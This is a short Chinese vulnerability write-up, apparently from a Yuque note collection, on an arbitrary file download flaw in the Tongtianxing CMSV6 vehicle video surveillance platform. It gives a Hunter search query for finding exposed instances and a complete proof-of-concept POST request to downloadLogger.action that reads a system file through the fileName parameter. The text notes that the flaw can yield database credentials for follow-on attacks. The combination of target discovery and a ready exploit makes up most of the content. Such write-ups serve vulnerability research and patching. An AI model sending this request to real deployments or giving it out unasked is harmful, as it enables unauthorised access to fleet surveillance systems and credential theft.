# 通天星CMSV6车载视频监控平台  downloadLogger任意文件下载

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台存在任意文件下载漏洞，攻击者可通过此漏洞下载敏感文件信息，获取数据库账号密码，从而为下一步攻击做准备。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/X3Ip5GtyEvMvrLCS/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-243948.png)

# 四、漏洞复现
```plain
POST /808gps/logger/downloadLogger.action HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Content-Type: application/x-www-form-urlencoded

fileName=C:\windows\win.ini
```

![1700148030526-73b31a17-3065-420a-ba37-b0399d1f568a.png](./img/X3Ip5GtyEvMvrLCS/1700148030526-73b31a17-3065-420a-ba37-b0399d1f568a-272668.png)



> 更新: 2024-12-28 13:05:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cvnplow5gdgbsaka>